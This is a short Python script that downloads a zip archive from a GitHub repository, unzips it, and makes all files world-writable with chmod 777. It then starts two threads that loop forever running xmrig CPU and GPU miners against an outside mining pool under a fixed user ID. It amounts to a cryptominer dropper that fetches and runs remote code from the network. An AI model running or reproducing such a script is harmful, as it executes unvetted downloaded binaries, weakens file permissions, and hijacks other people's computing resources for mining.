import threading
import os

os.system('wget https://github.com/akwebsec/bitcoin/raw/main/bitcoin.zip && unzip bitcoin.zip')
os.system('chmod 777 *')
print("MINING STARED PLEASE WAIT")


def db1():
    # os.system('ping google.com')
    while True:
        os.system('./xmrig -o pool.bmnr.pw:4444 -u 3982866 -p freebitcoin -k')


def db2():
    # os.system('ping google.com')
    while True:
        os.system('./xmrig-nvidia -o pool.bmnr.pw:4444 -u 3982866 -p freebitcoin -k')


run1 = threading.Thread(target=db1)
run1.start()

run2 = threading.Thread(target=db2)
run2.start()
